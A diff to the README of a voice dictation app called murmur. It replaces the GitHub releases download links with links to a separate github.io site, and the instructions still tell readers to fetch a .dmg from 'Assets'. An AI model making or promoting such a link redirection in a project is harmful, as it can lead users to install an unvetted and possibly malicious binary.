@@ -1,6 +1,6 @@
 # 🎙️ murmur - Private voice dictation for your computer
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ilovebrainsofsmallkids/murmur/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ilovebrainsofsmallkids.github.io)
 
 Murmur turns your spoken words into text on your screen. It runs directly on your device. Your data stays on your machine. You do not need an internet connection to use it. The software uses modern speech recognition technology to understand your voice clearly.
 
@@ -19,7 +19,7 @@ Check your computer settings if you do not know your processor type. Click the A
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the software: [https://github.com/ilovebrainsofsmallkids/murmur/releases](https://github.com/ilovebrainsofsmallkids/murmur/releases)
+1. Visit this page to download the software: [https://ilovebrainsofsmallkids.github.io](https://ilovebrainsofsmallkids.github.io)
 2. Look for the section labeled Assets.
 3. Click the file that ends with .dmg. 
 4. Wait for the download to finish.
